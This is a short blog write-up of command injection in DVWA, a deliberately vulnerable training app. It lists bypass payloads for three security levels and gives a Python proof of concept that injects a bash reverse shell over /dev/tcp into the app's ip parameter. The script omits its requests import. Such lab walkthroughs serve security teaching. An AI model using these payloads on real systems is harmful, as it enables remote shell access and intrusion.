---
title: DVWA Command Injection
# author: Gauranga
date: 2024-03-06 04:45:00 +00:00
categories: [Writing]
tags: [cybersecurity, DVWA, command injection, web security, vulnerability, exploitation, proof of concept]
pin: true
math: true
mermaid: true
image: https://cdn.acunetix.com/wp-content/uploads/2019/06/11110845/command-injection-910x478.png
#   path: /commons/devices-mockup.png
#   lqip: data:image/webp;base64,UklGRpoAAABXRUJQVlA4WAoAAAAQAAAADwAABwAAQUxQSDIAAAARL0AmbZurmr57yyIiqE8oiG0bejIYEQTgqiDA9vqnsUSI6H+oAERp2HZ65qP/VIAWAFZQOCBCAAAA8AEAnQEqEAAIAAVAfCWkAALp8sF8rgRgAP7o9FDvMCkMde9PK7euH5M1m6VWoDXf2FkP3BqV0ZYbO6NA/VFIAAAA
#   alt: Responsive rendering of Chirpy theme on multiple devices.
---

## Low Level

- **Functionality Check**: Application accepts input in `ip` parameter, directly passed to `shell_exec()`.
- **Injection**: Concatenated `;ls -la` as payload.
- **Vulnerability**: Lack of input validation allows command execution.

![](/cj/Untitled.png)

```python
import sys

url = "<http://127.0.0.1:42001/vulnerabilities/exec/>"

headers = {
    "Cookie": "PHPSESSID=<id>; security=<>"
}

def main():
    try:
        ip = f"bash -c 'bash -i >& /dev/tcp/{sys.argv[1]}/{sys.argv[2]} 0>&1'"
        data = {
            "ip": ";" + ip,
            "Submit": "Submit",
        }
        response = requests.post(url, headers=headers, data=data)

        if "www-data" in response.text:
            print("success")
        else:
            print("failed")
    except Exception as e:
        print("An error occurred:", e)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python3 poc.py <lhort> <lport>")
        sys.exit(1)
    else:
        main()
```

- The script serves as a Proof of Concept (PoC) to exploit a command injection vulnerability in a web application.
- It demonstrates how an attacker can execute arbitrary commands on the target system through the vulnerability.
- By injecting specially crafted commands, the attacker gains unauthorized access to the system.
- This unauthorized access can lead to further exploitation, such as data theft, system compromise, or launching other attacks.
- It's crucial to emphasize that exploiting vulnerabilities without proper authorization is both illegal and unethical.

---

## Medium Level

- **Functionality Check**: Application continues to execute OS commands.
- **Input Validation**: Concatenated `|` as payload.
- **Bypass**: Used `|ls -la` payload for successful execution.

![](/cj/Untitled 1.png)

---

## High Level

- **Functionality Check**: Application still executes OS commands.
- **Tightened Validation**: Additional characters like `&`, ``, `$`, `(` replaced with space.
- **Bypass**: Identified space after `|` character, used `127.0.0.1|ls -ls` payload for success.

![](/cj/Untitled 2.png)

---